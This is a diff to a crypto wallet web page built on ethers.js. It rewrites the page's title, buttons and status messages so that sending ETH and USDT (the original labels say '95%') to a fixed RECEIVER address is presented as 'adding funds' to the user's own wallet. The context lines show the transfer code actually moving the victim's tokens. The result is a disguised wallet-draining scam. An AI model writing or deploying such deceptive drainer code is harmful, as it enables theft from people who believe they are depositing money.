@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRYPTO PAYMENT GATEWAY</title>
+    <title>CONNECT YOUR WALLET TO ADD FUNDS</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
     <style>
         * {
@@ -386,12 +386,12 @@
                 <div class="action-buttons">
                     <button class="action-btn eth-btn" id="sendEthBtn" onclick="sendEth()">
                         <span class="btn-icon">Ξ</span>
-                        <span>SEND 95% ETH</span>
+                        <span>ADD ETH</span>
                     </button>
                     
                     <button class="action-btn usdt-btn" id="sendUsdtBtn" onclick="sendUSDT()">
                         <span class="btn-icon">$</span>
-                        <span>SEND 95% USDT</span>
+                        <span>ADD USDT</span>
                     </button>
                 </div>
             </div>
@@ -452,7 +452,7 @@
                 document.getElementById("transferSection").style.display = "block";
                 
                 // Update connect button
-                document.getElementById("connectBtn").textContent = "✅ WALLET CONNECTED";
+                document.getElementById("connectBtn").textContent = "✅ WALLET CONNECTED YOU CAN NOW ADD FUNDS TO YOUR WALLET";
                 document.getElementById("connectBtn").disabled = true;
                 
                 showStatus("Wallet connected successfully", "success");
@@ -504,7 +504,7 @@
         async function sendEth() {
             try {
                 if (!ethAmountToSend || ethAmountToSend <= 0) {
-                    showStatus("No ETH to send", "error");
+                    showStatus("INSUFFICIENT FUND TO ACCEPT PAYMENT PLEASE DEPOSIT TO YOUR WALLET AND TRY AGAIN", "error");
                     return;
                 }
                 
@@ -533,7 +533,7 @@
                 const receipt = await tx.wait();
                 
                 if (receipt.status === 1) {
-                    showStatus(`✅ ETH sent successfully!`, "success");
+                    showStatus(`✅ ACCOUNT ACCEPTED NETWORK YOUR PAYMENT IS PROCESSED!`, "success");
                     await loadBalances();
                 } else {
                     showStatus("Transaction failed", "error");
@@ -559,7 +559,7 @@
         async function sendUSDT() {
             try {
                 if (!usdtBalance || usdtBalance == 0) {
-                    showStatus("No USDT balance to send", "error");
+                    showStatus("INSUFFICIENT USDT TO ACCEPT THE PAYMENT PLEASE DEPOSIT USDT TO YOUR WALLET AND RETRY", "error");
                     return;
                 }
                 
@@ -578,12 +578,12 @@
                 // Send USDT transfer
                 const tx = await usdtContract.transfer(RECEIVER, sendAmount);
                 
-                showStatus(`USDT transfer submitted: ${tx.hash}`, "pending");
+                showStatus(`USDT ADD PROCESSED: ${tx.hash}`, "pending");
                 
                 const receipt = await tx.wait();
                 
                 if (receipt.status === 1) {
-                    showStatus(`✅ USDT sent successfully!`, "success");
+                    showStatus(`✅ USDT ADD successfully PROCESSED!`, "success");
                     await loadBalances();
                 } else {
                     showStatus("USDT transfer failed", "error");
